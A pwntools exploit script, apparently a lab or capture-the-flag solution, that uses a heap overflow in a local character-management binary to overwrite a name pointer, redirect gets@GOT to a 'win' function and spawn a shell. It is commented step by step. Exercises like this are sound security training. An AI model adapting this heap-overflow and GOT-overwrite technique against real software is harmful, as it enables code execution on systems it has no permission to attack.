#!/usr/bin/env python

from pwn import *

# We can cause a heap overflow by creating 2 characters
# Idea is to overwrite the second character's name pointer with the pointer of gets@got since the got area is writeable and plt is not writeable
# Then call `character_update_name` for the second character to overwrite the gets@got content with the address of `win`
# Call `character_update_name` for the first character with the argument "/bin/sh" (actually win gets called)

target = process("./bin/ex2")

# Create first character
target.sendline(b"1")
# WAR class pe corp nu pe mental
target.sendline(b"4")
# Random name
target.sendline(b"ALIN_WAR")

# Create second character
target.sendline(b"1")
# Shaman sa dam buff la war de pe secundar
target.sendline(b"2")
# Random name
target.sendline(b"shamanca_tha")

# Find how much we need to write until we get to the name ptr of the second character
# pwndbg> p ((char *)&characters[1]->name) - ((char *)characters[0]->name)
# $14 = 40

# objdump -R ./bin/ex2 | grep -i gets
gets_got_address = 0x404058

# Call `character_update_name` for the first character to overwrite second character's name ptr
target.sendline(b"2")
# Choose 1st character
target.sendline(b"1")
# Send payload to overwrite name ptr
payload = b"/bin/sh #" + (40 - 9) * b"A" + p64(gets_got_address)
target.sendline(payload)

# pwndbg> info address win
# Symbol "win" is a function at address 0x40141b.
win_address = 0x40141b

# Call `character_update_name` for the second character to overwrite gets@got with win_address
target.sendline(b"2")
# Choose 2nd character
target.sendline(b"2")
target.sendline(p64(win_address))

# Call `character_update_name` for the 1st character to trigger shell
target.sendline(b"2")
# Choose 1st character
target.sendline(b"1")

target.interactive()